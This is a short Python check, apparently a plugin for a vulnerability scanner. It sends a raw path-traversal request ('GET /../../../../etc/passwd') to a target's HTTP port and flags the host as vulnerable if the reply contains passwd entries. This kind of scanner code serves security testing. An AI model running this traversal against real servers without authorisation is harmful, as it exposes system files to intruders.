# coding=utf-8
import re
import socket
from config import is_port_open, is_http



@is_port_open
def verify(ip, port=80, name='', timeout=10):
    if is_http(ip, int(port)) is False:
        return
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            info = {
                'url': 'http://{}:{}'.format(ip, port),
                'vuln_name': 'random file read',
                'severity': 'medium',
                'proof': 'http;//{}:{}/../../../../../../../../../etc/passwd'.format(ip, port)
            }
            return info
    except:
        pass
